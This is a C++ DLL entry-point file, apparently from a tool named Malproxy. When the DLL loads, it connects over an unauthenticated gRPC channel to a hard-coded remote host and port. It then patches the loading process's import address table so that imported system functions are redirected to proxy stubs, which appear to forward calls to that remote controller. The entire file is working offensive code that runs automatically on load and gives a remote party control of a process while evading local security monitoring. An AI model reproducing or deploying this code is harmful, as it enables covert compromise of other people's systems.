// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <memory>
#include <RpcLib\MalproxySession.h>
#include <Framework\Utils.h>
#include <MalproxyClient\MalproxyClientRunner.h>
#include "Dbghelp.h"
 
extern std::map<std::string, std::map<std::string, FARPROC>> autogenerated_stubs;

void InitGRPC() {
    std::shared_ptr<MalproxySession> client = std::make_shared<MalproxySession>();
    std::string url = StringUtils::FormatString("192.168.1.101:8888");
    client->Connect(url, grpc::InsecureChannelCredentials());
    MalproxyClientRunner::Init(client);
}

void InstallHook() {
	ULONG ulSize = 0;
	PROC pHookFunction = NULL;
	PROC pHookedFunction = NULL;

	PSTR pszModName = NULL;
	printf("DLL IS UPLOADING\n");

	HMODULE hModule = GetModuleHandle(0);
	PIMAGE_IMPORT_DESCRIPTOR pImportDesc = NULL;

	//hooking
	for (const auto& lib : autogenerated_stubs) {
		//std::string lbName = lib.first;
		for (const auto& fn : lib.second) {
			std::string fnStubName = fn.first + "_stub";
			LPCSTR pfnStubName = const_cast<char*>(fnStubName.c_str());
			LPCSTR pLibName = const_cast<char*>(lib.first.c_str());
			LPCSTR pfnName = const_cast<char*>(fn.first.c_str());

			pHookFunction = GetProcAddress(GetModuleHandle(L"MalproxyClientDLL.dll"),(LPCSTR)pfnStubName);
			pHookedFunction = GetProcAddress(GetModuleHandleA((LPCSTR)pLibName),(LPCSTR)pfnName);
	 
			pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)ImageDirectoryEntryToData(
				hModule, TRUE, IMAGE_DIRECTORY_ENTRY_IMPORT, &ulSize);

			if (NULL != pImportDesc)
			{
				for (; pImportDesc->Name; pImportDesc++)
				{
					// get the module name
					pszModName = (PSTR)((PBYTE)hModule + pImportDesc->Name);

					if (NULL != pszModName)
					{
						//same module as the mapping element ?
						if (lstrcmpiA(pszModName, pLibName) == 0)
						{
							// get the functions
							PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((PBYTE)hModule + pImportDesc->FirstThunk);
							for (; pThunk->u1.Function; pThunk++)
							{
								PROC* ppfn = (PROC*)&pThunk->u1.Function;
								if (*ppfn == pHookedFunction)
								{
									WriteProcessMemory(GetCurrentProcess(), ppfn, &pHookedFunction, sizeof(pHookFunction), NULL);
									DWORD dwTest = GetLastError();
									printf("Hooking %s\n", pfnName);
									DWORD dwOldProtect = 0;
									if (VirtualProtect(ppfn, sizeof(pHookFunction), PAGE_WRITECOPY, &dwOldProtect))
									{
										WriteProcessMemory(GetCurrentProcess(), ppfn, &pHookFunction, sizeof(pHookFunction), NULL);
										VirtualProtect(ppfn, sizeof(pHookFunction), dwOldProtect, &dwOldProtect);
									}	 
								}  
							}
						}  
					}  
				}
			}
		}
	}
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
		InitGRPC();
        InstallHook();
    }
    return TRUE;
    }
}

